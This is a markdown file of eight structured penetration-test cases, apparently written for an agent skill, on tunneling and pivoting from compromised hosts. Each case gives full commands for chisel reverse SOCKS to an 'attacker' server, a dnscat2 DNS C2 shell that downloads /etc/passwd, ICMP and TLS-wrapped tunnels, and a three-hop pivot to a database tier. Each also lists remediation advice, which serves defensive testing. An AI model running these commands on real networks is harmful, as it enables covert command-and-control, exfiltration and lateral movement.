# Network Tunneling & Proxy Test Cases

> This file is a companion to `SKILL.md`, containing structured test cases organized by tunnel type and severity.

---

## Statistics

| Category | Count | Severity Range |
|------|------|-------------|
| A. SOCKS Proxy Setup | 1 | HIGH |
| B. HTTP Tunnel | 1 | MEDIUM |
| C. DNS Tunnel | 1 | HIGH |
| D. SSH Pivoting | 1 | MEDIUM |
| E. Proxy Chain | 1 | HIGH |
| F. ICMP Tunnel | 1 | MEDIUM |
| G. TLS Wrapping | 1 | MEDIUM |
| H. Multi-Hop Pivot Chain | 1 | CRITICAL |
| **Total** | **8** | **MEDIUM - CRITICAL** |

---

## A. SOCKS Proxy Setup

### TC-TUN-001: SOCKS5 Proxy via Chisel with Reverse Connection

| Field | Value |
|------|-----|
| **ID** | TC-TUN-001 |
| **Name** | SOCKS5 Proxy via Chisel with Reverse Connection |
| **Category** | A. SOCKS Proxy Setup |
| **Severity** | HIGH |
| **Objective** | Establish a reverse SOCKS5 proxy from a compromised host through an HTTP tunnel to enable internal network access |
| **Prerequisites** | Compromised host with outbound HTTP/HTTPS allowed; chisel binary deployed; attacker-controlled server reachable on port 8080 |
| **Test Steps** | 1. Start chisel server on attacker machine: `chisel server -p 8080 --reverse --socks5`<br>2. On compromised host, connect client: `chisel client http://attacker:8080 R:socks`<br>3. Verify SOCKS5 proxy is listening: `ss -tlnp \| grep 1080`<br>4. Test proxy connectivity: `curl --socks5 127.0.0.1:1080 http://internal-host`<br>5. Run nmap through proxy: `proxychains4 nmap -sT -Pn 192.168.1.0/24`<br>6. Document throughput and latency |
| **Expected Results** | SOCKS5 proxy established on attacker machine port 1080; all TCP traffic can be routed through compromised host to reach internal network |
| **Actual Impact** | Full TCP access to internal network segments reachable by the compromised host, enabling port scanning, service access, and lateral movement tooling |
| **Remediation** | Implement egress filtering to block unauthorized outbound HTTP connections; deploy deep packet inspection to detect HTTP tunneling patterns; monitor for chisel process execution on endpoints |

---

## B. HTTP Tunnel

### TC-TUN-002: HTTP Tunnel via Gost with TLS Encryption

| Field | Value |
|------|-----|
| **ID** | TC-TUN-002 |
| **Name** | HTTP Tunnel via Gost with TLS Encryption |
| **Category** | B. HTTP Tunnel |
| **Severity** | MEDIUM |
| **Objective** | Establish a covert HTTP tunnel encrypted with TLS to bypass network content inspection and reach internal services |
| **Prerequisites** | Gost binary available on both sides; outbound HTTPS allowed from target network; TLS certificate prepared |
| **Test Steps** | 1. Start gost server with TLS: `gost -L tls://:443`<br>2. Start gost client on compromised host: `gost -L :8080 -F tls://attacker:443`<br>3. Verify local proxy is active: `curl -x http://127.0.0.1:8080 http://internal-service`<br>4. Test SOCKS5 mode: `gost -L socks5://:1080 -F tls://attacker:443`<br>5. Verify tunnel survives idle timeout (wait 5 minutes, test again)<br>6. Measure bandwidth: `iperf3 -c target` through tunnel |
| **Expected Results** | Encrypted HTTP tunnel established; traffic appears as normal HTTPS to network monitoring; proxy functionality confirmed for both HTTP and SOCKS5 modes |
| **Actual Impact** | Covert proxy channel that evades HTTP content inspection; enables access to internal services through an encrypted tunnel that appears as standard HTTPS traffic |
| **Remediation** | Deploy TLS inspection (SSL/TLS termination proxy) to inspect encrypted traffic; block outbound connections to non-standard TLS endpoints; monitor for gost process signatures |

---

## C. DNS Tunnel

### TC-TUN-003: DNS C2 Tunnel via Dnscat2

| Field | Value |
|------|-----|
| **ID** | TC-TUN-003 |
| **Name** | DNS C2 Tunnel via Dnscat2 |
| **Category** | C. DNS Tunnel |
| **Severity** | HIGH |
| **Objective** | Establish a bidirectional command-and-control tunnel over DNS protocol to bypass HTTP/HTTPS egress filtering |
| **Prerequisites** | Attacker-controlled domain with authoritative DNS delegation; dnscat2 server and client compiled; target network allows outbound DNS queries; see `dns-attacks` skill for DNS infrastructure setup |
| **Test Steps** | 1. Configure NS record for tunnel subdomain pointing to attacker DNS server<br>2. Start dnscat2 server: `ruby ./dnscat2.rb --secret=abc123 tunnel.example.com`<br>3. Run dnscat2 client on target: `./dnscat --secret=abc123 tunnel.example.com`<br>4. Verify session established in dnscat2 console: `sessions`<br>5. Open interactive shell: `session -i 1` then `shell`<br>6. Transfer file: `download /etc/passwd`<br>7. Create port forward tunnel: `tunnel create --host 127.0.0.1 --port 8888`<br>8. Measure latency: `ping` through tunnel<br>9. Monitor DNS query patterns with tcpdump on attacker |
| **Expected Results** | Bidirectional DNS tunnel established; remote shell access; file transfer functional; all traffic encapsulated in DNS queries (TXT/CNAME records) to tunnel subdomain |
| **Actual Impact** | Persistent C2 channel that bypasses HTTP/HTTPS egress filtering; enables remote command execution, file exfiltration, and port forwarding through DNS protocol |
| **Remediation** | Implement DNS query length limits (block subdomain labels > 60 chars); restrict external DNS resolution to approved resolvers; monitor for high-frequency DNS TXT/CNAME queries to single domains; deploy DNS tunneling detection tools |

---

## D. SSH Pivoting

### TC-TUN-004: Transparent Network Access via Sshuttle

| Field | Value |
|------|-----|
| **ID** | TC-TUN-004 |
| **Name** | Transparent Network Access via Sshuttle |
| **Category** | D. SSH Pivoting |
| **Severity** | MEDIUM |
| **Objective** | Gain transparent Layer 3 network access to isolated subnets through an SSH pivot host without per-application proxy configuration |
| **Prerequisites** | SSH access to a pivot host (compromised or authorized); sshuttle installed on attacker machine; target subnet reachable from pivot host |
| **Test Steps** | 1. Start sshuttle to route target subnet: `sshuttle -r user@pivot-host 192.168.100.0/24`<br>2. Verify routing: `ip route show \| grep sshuttle`<br>3. Access internal service directly: `curl http://192.168.100.50`<br>4. Run nmap scan of target subnet: `nmap -sT 192.168.100.0/24`<br>5. Enable DNS through tunnel: `sshuttle --dns -r user@pivot-host 192.168.100.0/24`<br>6. Test internal hostname resolution: `nslookup internal-server.local`<br>7. Verify multiple subnets: `sshuttle -r user@pivot-host 192.168.100.0/24 10.10.0.0/16` |
| **Expected Results** | Transparent Layer 3 access to target subnets; all TCP traffic and optionally DNS routed through SSH tunnel without per-application proxy configuration |
| **Actual Impact** | VPN-like access to internal network through SSH pivot, enabling unmodified tools to reach isolated network segments as if directly connected |
| **Remediation** | Monitor SSH sessions for unusual traffic volume or long duration; implement SSH session logging; restrict SSH port forwarding on jump hosts; deploy network segmentation to limit pivot host reach |

---

## E. Proxy Chain

### TC-TUN-005: Multi-Hop Proxy Chain via Proxychains

| Field | Value |
|------|-----|
| **ID** | TC-TUN-005 |
| **Name** | Multi-Hop Proxy Chain via Proxychains |
| **Category** | E. Proxy Chain |
| **Severity** | HIGH |
| **Objective** | Route traffic through multiple chained proxy hops to reach deep network segments and obscure connection attribution |
| **Prerequisites** | Two or more compromised hosts with SOCKS/HTTP proxies running; proxychains installed; known internal targets in deep network segment |
| **Test Steps** | 1. Configure proxy chain in `/etc/proxychains4.conf`: add `socks5 127.0.0.1 1080` (first hop), `socks5 10.0.0.5 1080` (second hop)<br>2. Set strict chain mode to ensure all hops are used<br>3. Test connectivity through chain: `proxychains4 curl http://10.10.10.50`<br>4. Scan through chain: `proxychains4 nmap -sT -Pn 10.10.10.0/24 --top-ports 100`<br>5. Test SSH through chain: `proxychains4 ssh user@10.10.10.50`<br>6. Switch to dynamic chain mode and verify failover when one proxy is down<br>7. Document latency at each hop |
| **Expected Results** | Traffic routed through multiple proxy hops reaching deep network segments; connection attribution obscured through multiple intermediate hosts |
| **Actual Impact** | Deep network penetration through chained proxies; each hop extends reach further into isolated segments; attribution is obscured by the chain |
| **Remediation** | Monitor for sequential connection patterns through internal hosts; detect SOCKS handshake traffic (0x05 byte) on unexpected ports; implement host-based firewall rules restricting proxy software execution |

---

## F. ICMP Tunnel

### TC-TUN-006: TCP over ICMP Tunnel via Ptunnel

| Field | Value |
|------|-----|
| **ID** | TC-TUN-006 |
| **Name** | TCP over ICMP Tunnel via Ptunnel |
| **Category** | F. ICMP Tunnel |
| **Severity** | MEDIUM |
| **Objective** | Encapsulate TCP connections inside ICMP echo packets to bypass TCP/UDP egress filtering when only ICMP is permitted |
| **Prerequisites** | ICMP echo traffic allowed outbound from target network; ptunnel installed on both sides; relay host accessible via ICMP; SSH target behind relay host |
| **Test Steps** | 1. Start ptunnel server on relay host: `sudo ptunnel -x secretpass`<br>2. On compromised host, create ICMP tunnel: `sudo ptunnel -p relay-host -lp 2222 -da target-host -dp 22 -x secretpass`<br>3. Verify ICMP tunnel: `sudo tcpdump -i eth0 icmp -nn` (observe tunnel traffic)<br>4. SSH through ICMP tunnel: `ssh -p 2222 user@127.0.0.1`<br>5. Measure throughput: `scp -P 2222 largefile user@127.0.0.1:/tmp/`<br>6. Test tunnel stability under load (continuous data transfer for 5 minutes) |
| **Expected Results** | TCP connections tunneled through ICMP echo packets; SSH session established over ICMP; traffic appears as normal ping requests and replies to network monitoring |
| **Actual Impact** | Network access when only ICMP is permitted outbound; bypasses TCP/UDP egress filtering by encapsulating data in echo request/reply packets |
| **Remediation** | Block outbound ICMP echo requests to external hosts; rate-limit ICMP traffic; inspect ICMP payload content (legitimate pings have predictable payloads); deploy ICMP tunneling detection in IDS/IPS |

---

## G. TLS Wrapping

### TC-TUN-007: TLS Wrapping for Tunnel Obfuscation via Stunnel

| Field | Value |
|------|-----|
| **ID** | TC-TUN-007 |
| **Name** | TLS Wrapping for Tunnel Obfuscation via Stunnel |
| **Category** | G. TLS Wrapping |
| **Severity** | MEDIUM |
| **Objective** | Wrap existing tunnel protocols inside TLS encryption to evade deep packet inspection and hide protocol fingerprints |
| **Prerequisites** | Stunnel installed on both sides; TLS certificate generated; existing tunnel or proxy service to wrap |
| **Test Steps** | 1. Generate self-signed certificate: `openssl req -new -x509 -days 365 -nodes -out stunnel.pem -keyout stunnel.pem`<br>2. Configure stunnel server to wrap chisel on port 443: `accept = 0.0.0.0:443` -> `connect = 127.0.0.1:8080`<br>3. Configure stunnel client: `client = yes`, `accept = 127.0.0.1:9090` -> `connect = attacker:443`<br>4. Start stunnel on both sides<br>5. Connect chisel through stunnel: `chisel client http://127.0.0.1:9090 R:socks`<br>6. Verify with tcpdump that only TLS traffic is visible: `tcpdump -i eth0 port 443 -nn`<br>7. Test connection stability and throughput through double-wrapped tunnel |
| **Expected Results** | Original tunnel protocol (chisel HTTP) is fully wrapped inside TLS; network monitoring sees only standard HTTPS traffic on port 443; chisel HTTP headers are invisible to DPI |
| **Actual Impact** | Deep packet inspection evasion; tunnel protocol fingerprint hidden behind TLS encryption; appears as legitimate HTTPS traffic to network monitoring tools |
| **Remediation** | Deploy TLS inspection (MITM proxy with trusted CA) to decrypt and inspect traffic; block outbound TLS connections using self-signed certificates; validate certificate chains on egress traffic |

---

## H. Multi-Hop Pivot Chain

### TC-TUN-008: Full Multi-Hop Pivot Chain (SSH + Chisel + Ligolo-ng)

| Field | Value |
|------|-----|
| **ID** | TC-TUN-008 |
| **Name** | Full Multi-Hop Pivot Chain (SSH + Chisel + Ligolo-ng) |
| **Category** | H. Multi-Hop Pivot Chain |
| **Severity** | CRITICAL |
| **Objective** | Build a three-hop pivot chain combining SSH, HTTP tunnel, and TUN interface pivoting to reach isolated deep network segments |
| **Prerequisites** | Three compromised hosts in different network segments (DMZ, internal, database tier); chisel and ligolo-ng binaries deployed; SSH access to first pivot |
| **Test Steps** | 1. Establish SSH SOCKS proxy to DMZ pivot: `ssh -D 1080 -fN user@dmz-host`<br>2. Through SOCKS proxy, deploy chisel to internal pivot: `proxychains4 scp chisel user@internal-host:/tmp/`<br>3. Start chisel server on DMZ pivot and client on internal pivot<br>4. Verify second SOCKS proxy: `curl --socks5 127.0.0.1:1081 http://10.10.10.1`<br>5. Deploy ligolo-ng agent on internal pivot, connect through chisel tunnel<br>6. Configure route to database tier: `sudo ip route add 10.10.20.0/24 dev ligolo-tun`<br>7. Access database server: `proxychains4 mysql -h 10.10.20.50 -u admin -p`<br>8. Document full chain: Operator -> SOCKS5 -> DMZ -> chisel -> Internal -> ligolo-ng -> DB tier |
| **Expected Results** | Three-hop pivot chain reaching isolated database network segment; transparent access to final target through combined SSH, HTTP tunnel, and TUN interface |
| **Actual Impact** | Deep network penetration through chained pivoting mechanisms; each hop extends reach into progressively more isolated network segments, simulating advanced adversary lateral movement |
| **Remediation** | Implement strict network microsegmentation between tiers; deploy host-based intrusion detection on all pivot-capable hosts; monitor for tunnel-related process execution (chisel, ligolo-ng, socat); correlate egress traffic patterns across network segments |

---

## Pass Criteria Checklist

- [ ] SOCKS5 proxy established and verified with curl/nmap through proxy
- [ ] HTTP tunnel encrypted with TLS and verified as undetectable by DPI
- [ ] DNS tunnel established with shell access and file transfer confirmed
- [ ] Transparent subnet access via sshuttle working for all target IPs
- [ ] Multi-hop proxy chain functional with failover tested
- [ ] ICMP tunnel carries SSH session successfully
- [ ] TLS wrapping verified to hide protocol fingerprints from tcpdump
- [ ] Full three-hop pivot chain reaches isolated database tier
